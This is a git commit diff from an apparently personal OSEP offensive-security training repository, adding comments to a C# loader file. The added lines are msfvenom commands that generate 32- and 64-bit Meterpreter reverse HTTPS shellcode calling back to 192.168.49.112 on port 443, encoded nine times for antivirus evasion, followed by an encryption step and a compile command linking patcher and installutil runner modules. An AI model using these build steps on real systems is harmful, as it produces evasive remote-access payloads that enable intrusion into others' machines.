f0298284e9f5c3233a516ecd32fff32fdc5a06b2
dos-m0nk3y <53410240+dos-m0nk3y@users.noreply.github.com>
2023-04-05 02:02:04 -0400

    Update C# exploits to include encoding & encryption

--- OSEP/C#/main.cs
+++ OSEP/C#/main.cs
@@ -1,3 +1,6 @@
+// msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.49.112 LPORT=443 EXITFUNC=thread --encoder x86/shikata_ga_nai -i 9 -f raw -o shellcode32.bin
+// msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.112 LPORT=443 EXITFUNC=thread --encoder x64/xor_dynamic -i 9 -f raw -o shellcode64.bin
+// python3 encrypt.py
 // mcs main.cs patcher.cs utility.cs runner.cs installutil.cs /reference:System.Management.Automation.dll /reference:System.Configuration.Install.dll
 
 public class main
